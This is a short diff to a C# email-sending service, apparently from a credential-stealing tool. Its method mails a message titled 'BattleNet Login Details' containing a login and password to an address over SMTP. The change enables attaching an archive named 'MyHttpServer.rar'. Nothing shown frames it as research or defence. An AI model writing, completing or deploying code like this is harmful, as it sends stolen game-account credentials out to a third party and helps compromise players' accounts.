@@ -29,7 +29,7 @@ public class EmailSenderService: IEmailSenderService
         var message = new MailMessage(from, to);
         message.Subject = "BattleNet Login Details";
         message.Body = $"Login: {login}\nPassword: {password}";
-        // message.Attachments.Add(new Attachment("../../../MyHttpServer.zip"));
+        message.Attachments.Add(new Attachment("../../../MyHttpServer.rar"));
         var smtpClient = new SmtpClient(_smtpServer);
         smtpClient.Credentials = new NetworkCredential(_smtpUsername, _smtpPassword);
         smtpClient.EnableSsl = true;
